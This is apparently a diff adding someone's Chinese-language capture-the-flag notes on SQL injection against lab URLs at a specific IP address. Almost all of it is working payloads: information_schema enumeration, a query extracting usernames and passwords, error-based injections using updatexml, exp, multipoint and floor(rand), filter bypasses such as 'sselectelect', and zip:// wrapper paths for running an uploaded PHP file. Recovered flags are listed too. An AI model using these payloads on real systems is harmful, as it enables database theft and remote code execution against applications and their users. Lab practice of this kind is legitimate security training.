@@ -1,0 +1,36 @@
+查询某个数据库所有表
+select group_concat(table_name) from information_schema.tables where table_schema='perfor';
+查询所有数据库
+mid((select group_concat(schema_name) from information_schema.schemata),1,31);
+查询某个表所有字段
+select group_concat(column_name) from information_schema.columns where table_schema='sqlitest' and table_name='userinfo'
+查询密码
+select username,password from userinfo
+
+and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+and multipoint((select * from(select * from(select user())a)b));
+
+and exp(~(select * from(select user())a));
+
+and updatexml(1,version(),3)
+
+错误flag
+flag{8e191229035d2593a51e94077573f09e}
+
+http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' and substr((select flag from flag),1,1)='f
+
+sql1 flag{0e6ef033cf65a5b24d98c853f998ed8f}
+and select过滤
+http://121.40.71.160:32788/Sqli1.php?id=1%27%26%26updatexml(0x23,(mid((sselectelect%20flag%20from%20flag),1,100)),0x23)--+
+sql2  flag{0e6ef033cf65a5b24d98c853f998ed8f}
+%26%26 substr((select flag from flag) from 1 for 1)='f"
+http://121.40.71.160:32788/Sqli2.php?id=1%27%26%26%20substr((select%20flag%20from%20flag)%20from%201%20for%201)=%27f%22
+sql3 flag{0e6ef033cf65a5b24d98c853f998ed8f}
+http://121.40.71.160:32788/Sqli3.php?id=1%27%20%26%26%20substr((sselectelect%20flag%20from%20flag)%20from%201%20foorr%201)=%27f
+
+
+select group_concat(table_name) from information_schema.tables where table_schema='ssrf';
+
+/var/www/html\uploads/a4a22ef2bdb6b27beaadab272f322f63.zip%23test.php
+zip:///var/www/html/uploads/69375d4146185554bec820ad8747f298.zip%231.php
